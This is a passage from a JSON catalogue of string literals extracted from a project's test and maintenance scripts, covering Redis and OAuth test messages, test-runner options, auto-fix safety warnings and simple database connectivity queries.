      "locations": [
        "scripts/auto_fix_test_violations.py:1006"
      ]
    },
    "Recommendations:": {
      "value": "Recommendations:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:660"
      ]
    },
    "Recommended approach:": {
      "value": "Recommended approach:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1017"
      ]
    },
    "Recommended splitting strategies:": {
      "value": "Recommended splitting strategies:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:365"
      ]
    },
    "Redirect URI doesn't match staging": {
      "value": "Redirect URI doesn't match staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:219"
      ]
    },
    "Redirect to: [cyan]": {
      "value": "Redirect to: [cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:193"
      ]
    },
    "Redis URL should not use localhost in staging, got:": {
      "value": "Redis URL should not use localhost in staging, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:233"
      ]
    },
    "Redis cleanup timeout:": {
      "value": "Redis cleanup timeout:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:253"
      ]
    },
    "Redis close error:": {
      "value": "Redis close error:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:143"
      ]
    },
    "Redis connection failed": {
      "value": "Redis connection failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:894",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:190"
      ]
    },
    "Redis connection hanging during Cloud Run shutdown": {
      "value": "Redis connection hanging during Cloud Run shutdown",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:116"
      ]
    },
    "Redis connection lost": {
      "value": "Redis connection lost",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:427"
      ]
    },
    "Redis container not available:": {
      "value": "Redis container not available:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:81"
      ]
    },
    "Redis down": {
      "value": "Redis down",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:396"
      ]
    },
    "Redis not available for connection testing": {
      "value": "Redis not available for connection testing",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:75"
      ]
    },
    "Redis not available for health monitoring test": {
      "value": "Redis not available for health monitoring test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:272"
      ]
    },
    "Redis not available for recovery testing": {
      "value": "Redis not available for recovery testing",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:165"
      ]
    },
    "Redis session cleanup hanging during shutdown": {
      "value": "Redis session cleanup hanging during shutdown",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:237"
      ]
    },
    "Redis session cleanup hanging prevented graceful shutdown": {
      "value": "Redis session cleanup hanging prevented graceful shutdown",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:254"
      ]
    },
    "Redis should be in degraded services": {
      "value": "Redis should be in degraded services",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:264"
      ]
    },
    "Redis-dependent tests": {
      "value": "Redis-dependent tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:118"
      ]
    },
    "RedisTestMixin": {
      "value": "RedisTestMixin",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/__init__.py:17"
      ]
    },
    "Reduce mocking by using real components and external API mocks only": {
      "value": "Reduce mocking by using real components and external API mocks only",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:403"
      ]
    },
    "Reduce mocking in": {
      "value": "Reduce mocking in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:370"
      ]
    },
    "Refactor": {
      "value": "Refactor",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:366"
      ]
    },
    "Referer": {
      "value": "Referer",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1079",
        "auth_service/tests/test_security.py:365",
        "auth_service/tests/test_security.py:698"
      ]
    },
    "Refresh token duration:": {
      "value": "Refresh token duration:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:275"
      ]
    },
    "Refresh token should be valid": {
      "value": "Refresh token should be valid",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:75"
      ]
    },
    "Refresh token should work initially": {
      "value": "Refresh token should work initially",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:188"
      ]
    },
    "Remaining L3 files:": {
      "value": "Remaining L3 files:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:290"
      ]
    },
    "Remaining syntax errors:": {
      "value": "Remaining syntax errors:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:290"
      ]
    },
    "Remove duplicate test setup code from all test files.\n\nThis script finds and removes the duplicate sys.path manipulation code\nthat appears in hundreds of test files, ensuring only the centralized\nsetup_test_path() function is used.": {
      "value": "Remove duplicate test setup code from all test files.\n\nThis script finds and removes the duplicate sys.path manipulation code\nthat appears in hundreds of test files, ensuring only the centralized\nsetup_test_path() function is used.",
      "category": "test_literals",
      "locations": [
        "scripts/remove_duplicate_test_setup.py:1"
      ]
    },
    "Remove expired sessions from database": {
      "value": "Remove expired sessions from database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:27"
      ]
    },
    "Remove or mark redundant tests": {
      "value": "Remove or mark redundant tests",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:63"
      ]
    },
    "Remove sessions inactive for specified days": {
      "value": "Remove sessions inactive for specified days",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:40"
      ]
    },
    "Removed original file": {
      "value": "Removed original file",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:289"
      ]
    },
    "Removing": {
      "value": "Removing",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:294"
      ]
    },
    "Renaming:": {
      "value": "Renaming:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:161"
      ]
    },
    "Replace hardcoded sleeps in": {
      "value": "Replace hardcoded sleeps in",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:181"
      ]
    },
    "Replace mocks with real components or move to unit tests": {
      "value": "Replace mocks with real components or move to unit tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:371"
      ]
    },
    "Replace with proper function signature and real implementation": {
      "value": "Replace with proper function signature and real implementation",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:200"
      ]
    },
    "Replace with real data source or move to test fixtures": {
      "value": "Replace with real data source or move to test fixtures",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:178"
      ]
    },
    "Replace with real implementation or move to test directory": {
      "value": "Replace with real implementation or move to test directory",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:154"
      ]
    },
    "Replaced UserFlowTestBase with unittest.TestCase": {
      "value": "Replaced UserFlowTestBase with unittest.TestCase",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:244"
      ]
    },
    "Replay of auth code should be prevented": {
      "value": "Replay of auth code should be prevented",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:89"
      ]
    },
    "Report format (default: text)": {
      "value": "Report format (default: text)",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:359"
      ]
    },
    "Report saved to": {
      "value": "Report saved to",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:438",
        "scripts/compliance/test_size_validator.py:539",
        "scripts/remove_test_stubs.py:349"
      ]
    },
    "Report saved to:": {
      "value": "Report saved to:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:421",
        "scripts/auto_fix_test_violations.py:986"
      ]
    },
    "Report-only mode. Use --force-unsafe-fix and --confirm-unsafe for actual changes (NOT RECOMMENDED)": {
      "value": "Report-only mode. Use --force-unsafe-fix and --confirm-unsafe for actual changes (NOT RECOMMENDED)",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1015"
      ]
    },
    "Report:": {
      "value": "Report:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:705"
      ]
    },
    "Reproduces: Error while closing socket [Errno 9] Bad file descriptor\n        Root Cause: Inadequate container lifecycle management": {
      "value": "Reproduces: Error while closing socket [Errno 9] Bad file descriptor\n        Root Cause: Inadequate container lifecycle management",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:48"
      ]
    },
    "Reproduces: Invalid token: Signature verification failed\n        Root Cause: Fragmented secret management": {
      "value": "Reproduces: Invalid token: Signature verification failed\n        Root Cause: Fragmented secret management",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:93"
      ]
    },
    "Reproduces: JWT security validation error: Not enough segments\n        Root Cause: No validation of OAuth response completeness": {
      "value": "Reproduces: JWT security validation error: Not enough segments\n        Root Cause: No validation of OAuth response completeness",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:131"
      ]
    },
    "Reproduces: OAuth callback error: invalid_client (401)\n        Root Cause: Cross-environment credential misuse": {
      "value": "Reproduces: OAuth callback error: invalid_client (401)\n        Root Cause: Cross-environment credential misuse",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:188"
      ]
    },
    "Reproduces: connect() got an unexpected keyword argument 'sslmode'\n        Root Cause: Missing SSL parameter compatibility handling": {
      "value": "Reproduces: connect() got an unexpected keyword argument 'sslmode'\n        Root Cause: Missing SSL parameter compatibility handling",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:229"
      ]
    },
    "Reproduces: password authentication failed for user 'postgres'\n        Root Cause: No pre-deployment validation framework": {
      "value": "Reproduces: password authentication failed for user 'postgres'\n        Root Cause: No pre-deployment validation framework",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:22"
      ]
    },
    "Request payload too large. Maximum size:": {
      "value": "Request payload too large. Maximum size:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:48"
      ]
    },
    "Request processed in 45ms": {
      "value": "Request processed in 45ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:126"
      ]
    },
    "Request processed successfully": {
      "value": "Request processed successfully",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:97"
      ]
    },
    "Request timeout": {
      "value": "Request timeout",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:135"
      ]
    },
    "Require Real LLM:": {
      "value": "Require Real LLM:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:902"
      ]
    },
    "Require Real Services:": {
      "value": "Require Real Services:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:901"
      ]
    },
    "Reset all tables - use with caution": {
      "value": "Reset all tables - use with caution",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:85"
      ]
    },
    "Resilience and recovery validation tests": {
      "value": "Resilience and recovery validation tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:119"
      ]
    },
    "Resource cleanup failed during disposal": {
      "value": "Resource cleanup failed during disposal",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:325"
      ]
    },
    "Resource cleanup successful": {
      "value": "Resource cleanup successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:362"
      ]
    },
    "Resource cleanup test failed:": {
      "value": "Resource cleanup test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:366"
      ]
    },
    "Resource leak detected:": {
      "value": "Resource leak detected:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:353"
      ]
    },
    "Response:": {
      "value": "Response:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:166",
        "scripts/test_oauth_local.py:212",
        "scripts/test_oauth_local.py:270",
        "scripts/test_oauth_local.py:273",
        "scripts/test_oauth_local.py:322"
      ]
    },
    "Result": {
      "value": "Result",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:351"
      ]
    },
    "Result:": {
      "value": "Result:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:181",
        "scripts/test_auth_database_sessions.py:200",
        "scripts/test_verify_workflow.py:36",
        "scripts/test_verify_workflow.py:48",
        "scripts/test_verify_workflow.py:71"
      ]
    },
    "Results saved to:": {
      "value": "Results saved to:",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:149",
        "scripts/fix_test_batch.py:384",
        "scripts/iterative_test_fix_loop.py:159"
      ]
    },
    "Results will be saved to:": {
      "value": "Results will be saved to:",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:143"
      ]
    },
    "Results:": {
      "value": "Results:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:237",
        "scripts/auto_fix_test_sizes.py:736"
      ]
    },
    "Resume execution from specific category": {
      "value": "Resume execution from specific category",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:829"
      ]
    },
    "Retry attempt 1 of 3": {
      "value": "Retry attempt 1 of 3",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:104"
      ]
    },
    "Reuse attempt": {
      "value": "Reuse attempt",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:82"
      ]
    },
    "Revenue-critical path tests (1-2min)": {
      "value": "Revenue-critical path tests (1-2min)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:55"
      ]
    },
    "Review recent deployments": {
      "value": "Review recent deployments",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:418"
      ]
    },
    "Review service dependencies": {
      "value": "Review service dependencies",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:408"
      ]
    },
    "Review shared fixtures and utilities": {
      "value": "Review shared fixtures and utilities",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:444"
      ]
    },
    "Revoke all sessions for a user": {
      "value": "Revoke all sessions for a user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:140"
      ]
    },
    "Root": {
      "value": "Root",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:42"
      ]
    },
    "Root directory to scan": {
      "value": "Root directory to scan",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:928"
      ]
    },
    "Root endpoint returned status": {
      "value": "Root endpoint returned status",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:145"
      ]
    },
    "Root endpoint returned unexpected service:": {
      "value": "Root endpoint returned unexpected service:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:150"
      ]
    },
    "Run E2E tests with Cypress": {
      "value": "Run E2E tests with Cypress",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:394"
      ]
    },
    "Run ESLint": {
      "value": "Run ESLint",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:407"
      ]
    },
    "Run Jest in watch mode": {
      "value": "Run Jest in watch mode",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:400"
      ]
    },
    "Run TypeScript type checking": {
      "value": "Run TypeScript type checking",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:409"
      ]
    },
    "Run all WebSocket functionality tests.": {
      "value": "Run all WebSocket functionality tests.",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:259"
      ]
    },
    "Run all coordination fix validation tests.": {
      "value": "Run all coordination fix validation tests.",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:38"
      ]
    },
    "Run all initialization tests.": {
      "value": "Run all initialization tests.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:184"
      ]
    },
    "Run all integration tests": {
      "value": "Run all integration tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:128"
      ]
    },
    "Run all staging deployment tests": {
      "value": "Run all staging deployment tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:184"
      ]
    },
    "Run all tests": {
      "value": "Run all tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:123"
      ]
    },
    "Run autonomous test review based on mode": {
      "value": "Run autonomous test review based on mode",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:34"
      ]
    },
    "Run benchmark comparison with standard execution": {
      "value": "Run benchmark comparison with standard execution",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:379"
      ]
    },
    "Run comprehensive staging tests": {
      "value": "Run comprehensive staging tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:82"
      ]
    },
    "Run integration tests separately with proper services running": {
      "value": "Run integration tests separately with proper services running",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:80"
      ]
    },
    "Run iterative test-fix loop": {
      "value": "Run iterative test-fix loop",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:170"
      ]
    },
    "Run multiple categories (e.g., '--categories unit integration api')": {
      "value": "Run multiple categories (e.g., '--categories unit integration api')",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:725"
      ]
    },
    "Run previously failed tests first": {
      "value": "Run previously failed tests first",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:490"
      ]
    },
    "Run quick staging health checks only": {
      "value": "Run quick staging health checks only",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:77"
      ]
    },
    "Run quick validation only": {
      "value": "Run quick validation only",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:433"
      ]
    },
    "Run specific category (e.g., 'unit', 'integration', 'api')": {
      "value": "Run specific category (e.g., 'unit', 'integration', 'api')",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:719"
      ]
    },
    "Run tests against staging environment": {
      "value": "Run tests against staging environment",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:73"
      ]
    },
    "Run tests from a specific category": {
      "value": "Run tests from a specific category",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:481",
        "scripts/test_frontend.py:388"
      ]
    },
    "Run tests in parallel": {
      "value": "Run tests in parallel",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:777"
      ]
    },
    "Run tests matching pattern": {
      "value": "Run tests matching pattern",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:801"
      ]
    },
    "Run tests to validate they pass before suggesting fixes": {
      "value": "Run tests to validate they pass before suggesting fixes",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:934"
      ]
    },
    "Run the complete E2E test suite.": {
      "value": "Run the complete E2E test suite.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:72"
      ]
    },
    "Run with --verbose to see details": {
      "value": "Run with --verbose to see details",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:101",
        "scripts/startup_test_executor.py:173",
        "scripts/startup_test_executor.py:265"
      ]
    },
    "Running 'alembic current'...": {
      "value": "Running 'alembic current'...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:144"
      ]
    },
    "Running Backend Startup Tests": {
      "value": "Running Backend Startup Tests",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:55"
      ]
    },
    "Running Cypress E2E Tests": {
      "value": "Running Cypress E2E Tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:489"
      ]
    },
    "Running ESLint...": {
      "value": "Running ESLint...",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:313"
      ]
    },
    "Running End-to-End Tests": {
      "value": "Running End-to-End Tests",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:197"
      ]
    },
    "Running Frontend Startup Tests": {
      "value": "Running Frontend Startup Tests",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:126"
      ]
    },
    "Running Jest Tests": {
      "value": "Running Jest Tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:494"
      ]
    },
    "Running TypeScript type check...": {
      "value": "Running TypeScript type check...",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:333"
      ]
    },
    "Running auth service startup integration tests...": {
      "value": "Running auth service startup integration tests...",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:275"
      ]
    },
    "Running command:": {
      "value": "Running command:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:59"
      ]
    },
    "Running command:\n  pytest": {
      "value": "Running command:\n  pytest",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:372"
      ]
    },
    "Running test:": {
      "value": "Running test:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:54"
      ]
    },
    "Running tests...": {
      "value": "Running tests...",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:108",
        "scripts/simple_test_fix_loop.py:15"
      ]
    },
    "Running verify_workflow_status.py validation tests...": {
      "value": "Running verify_workflow_status.py validation tests...",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:77"
      ]
    },
    "Running:": {
      "value": "Running:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:50",
        "scripts/fix_common_test_issues.py:59",
        "scripts/startup_test_executor.py:78",
        "scripts/startup_test_executor.py:150",
        "scripts/startup_test_executor.py:242",
        "scripts/test_frontend.py:194",
        "scripts/test_frontend.py:232",
        "scripts/test_staging_env.py:166"
      ]
    },
    "SAFE MODE ENABLED: Only analysis and dry-run operations allowed": {
      "value": "SAFE MODE ENABLED: Only analysis and dry-run operations allowed",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:691"
      ]
    },
    "SAFETY: Actual file splitting is disabled by default. Use force_unsafe=True if you really want to modify files (NOT RECOMMENDED). Consider manual refactoring instead.": {
      "value": "SAFETY: Actual file splitting is disabled by default. Use force_unsafe=True if you really want to modify files (NOT RECOMMENDED). Consider manual refactoring instead.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:333"
      ]
    },
    "SAFETY: Automatic function refactoring is disabled. This operation is too dangerous for automatic execution. Please refactor manually.": {
      "value": "SAFETY: Automatic function refactoring is disabled. This operation is too dangerous for automatic execution. Please refactor manually.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:614"
      ]
    },
    "SAFETY: Cannot perform actual fixes in safe mode. Use dry_run=True for suggestions or explicitly set safe_mode=False and force_unsafe=True (NOT RECOMMENDED).": {
      "value": "SAFETY: Cannot perform actual fixes in safe mode. Use dry_run=True for suggestions or explicitly set safe_mode=False and force_unsafe=True (NOT RECOMMENDED).",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:786"
      ]
    },
    "SAFETY: Cannot perform actual fixes with safe mode enabled": {
      "value": "SAFETY: Cannot perform actual fixes with safe mode enabled",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:966"
      ]
    },
    "SAFETY: Unsafe operations require --confirm-unsafe flag. Please reconsider using manual refactoring instead.": {
      "value": "SAFETY: Unsafe operations require --confirm-unsafe flag. Please reconsider using manual refactoring instead.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:944"
      ]
    },
    "SCAN COMPLETE": {
      "value": "SCAN COMPLETE",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:222"
      ]
    },
    "SECRET": {
      "value": "SECRET",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:49",
        "scripts/test_oauth_local.py:77"
      ]
    },
    "SECRET_MANAGER_PROJECT_ID": {
      "value": "SECRET_MANAGER_PROJECT_ID",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:34",
        "scripts/test_staging_config.py:44"
      ]
    },
    "SECURITY ISSUE: Token blacklist must persist across service restarts": {
      "value": "SECURITY ISSUE: Token blacklist must persist across service restarts",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:134"
      ]
    },
    "SECURITY ISSUE: User blacklist must persist across service restarts": {
      "value": "SECURITY ISSUE: User blacklist must persist across service restarts",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:135"
      ]
    },
    "SELECT": {
      "value": "SELECT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:123",
        "auth_service/tests/test_security.py:177",
        "auth_service/tests/test_security.py:207",
        "auth_service/tests/test_security.py:615"
      ]
    },
    "SELECT 1": {
      "value": "SELECT 1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:223"
      ]
    },
    "SELECT 1 FROM auth_users LIMIT 1": {
      "value": "SELECT 1 FROM auth_users LIMIT 1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:105"
      ]
    },
    "SELECT 1 FROM pg_database WHERE datname = :db_name": {
      "value": "SELECT 1 FROM pg_database WHERE datname = :db_name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:128"
      ]
    },
    "SELECT 1 as test_value": {
      "value": "SELECT 1 as test_value",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:40"
      ]
    },
    "SELECT COUNT(*) FROM pg_user": {
      "value": "SELECT COUNT(*) FROM pg_user",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:73"
      ]
    },
    "SELECT current_database()": {
      "value": "SELECT current_database()",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:91"
      ]
    },
    "SELECT name FROM sqlite_master WHERE type='table' AND name='auth_users'": {
      "value": "SELECT name FROM sqlite_master WHERE type='table' AND name='auth_users'",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:62"
      ]
    },
    "SELECT name FROM sqlite_master WHERE type='table';": {
      "value": "SELECT name FROM sqlite_master WHERE type='table';",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:39",
        "auth_service/debug_db_test.py:46"
      ]
    },
    "SELECT version()": {
      "value": "SELECT version()",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:68",
        "auth_service/test_staging_db_connection.py:103",
        "auth_service/test_staging_db_connection.py:206",
        "scripts/test_async_postgres.py:48",
        "scripts/test_staging_db_direct.py:91",
        "scripts/test_staging_db_direct.py:108"
      ]
    },
    "SERIALIZABLE": {
      "value": "SERIALIZABLE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:19"
      ]
    },
    "SERVICE COORDINATION FIX VALIDATION SUMMARY": {
      "value": "SERVICE COORDINATION FIX VALIDATION SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:372"
      ]
    },
    "SERVICE STARTUP ORCHESTRATION TEST": {
      "value": "SERVICE STARTUP ORCHESTRATION TEST",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:128"
      ]
    },
    "SERVICE_ID": {
      "value": "SERVICE_ID",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:41",
        "auth_service/test_url_construction.py:42",
        "auth_service/tests/test_auth_token_generation.py:40",
        "auth_service/tests/test_auth_token_validation.py:40",
        "auth_service/tests/test_critical_oauth_environment_failures.py:48",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:43",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:71",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:104",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:133",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:165"
      ]
    },
    "SERVICE_SECRET": {
      "value": "SERVICE_SECRET",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:42",
        "auth_service/test_url_construction.py:43",
        "auth_service/tests/test_auth_token_generation.py:39",
        "auth_service/tests/test_auth_token_validation.py:39",
        "auth_service/tests/test_critical_oauth_environment_failures.py:47",
        "scripts/unified_test_runner.py:211"
      ]
    },
    "SESSION_CREATED": {
      "value": "SESSION_CREATED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:29",
        "auth_service/tests/factories/audit_factory.py:152"
      ]
    },
    "SESSION_EXPIRED": {
      "value": "SESSION_EXPIRED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:30"
      ]
    },
    "SESSION_EXPIRE_HOURS": {
      "value": "SESSION_EXPIRE_HOURS",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:180"
      ]
    },
    "SEVERITY BREAKDOWN:": {
      "value": "SEVERITY BREAKDOWN:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:314"
